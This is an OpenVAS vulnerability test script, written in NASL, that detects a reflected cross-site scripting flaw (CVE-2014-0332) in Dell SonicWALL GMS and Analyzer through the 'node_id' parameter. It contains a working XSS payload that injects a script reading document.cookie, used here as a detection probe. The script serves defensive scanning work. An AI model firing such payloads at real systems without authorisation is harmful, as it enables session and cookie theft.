##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dell_sonicwall_node_id_xss_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# DELL SonicWALL 'node_id' Cross Site Scripting Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804239");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2014-0332");
  script_bugtraq_id(65498);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-02-17 19:09:31 +0530 (Mon, 17 Feb 2014)");
  script_name("DELL SonicWALL 'node_id' Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is running DELL SonicWALL and is prone to cross site scripting
vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it is
able to read the string or not.");
  script_tag(name:"insight", value:"The flaw is due to an input passed via the 'node_id' parameter to
'sgms/mainPage', which is not properly sanitised before using it.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to steal the victim's
cookie-based authentication credentials.");
  script_tag(name:"affected", value:"DELL SonicWALL 7.0 and 7.1");
  script_tag(name:"solution", value:"Upgrade to DELL SonicWALL version 7.2 or later.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/91062");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125180");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Feb/108");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.sonicwall.com/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

dellPort = get_http_port(default:80);

dellReq = http_get(item:"/sgms/login", port:dellPort);
dellRes = http_keepalive_send_recv(port:dellPort, data:dellReq, bodyonly:TRUE);

if(">Dell SonicWALL Analyzer Login<" >< dellRes ||
   ">Dell SonicWALL GMS Login<" >< dellRes)
{
  url = '/sgms/mainPage?node_id=aaaaa";><script>alert(document.cookie);</script>';

  if(http_vuln_check(port:dellPort, url:url, check_header:TRUE,
     pattern:"><script>alert\(document.cookie\);</script>"))
  {
    report = report_vuln_url( port:dellPort, url:url );
    security_message(port:dellPort, data:report);
    exit(0);
  }
}
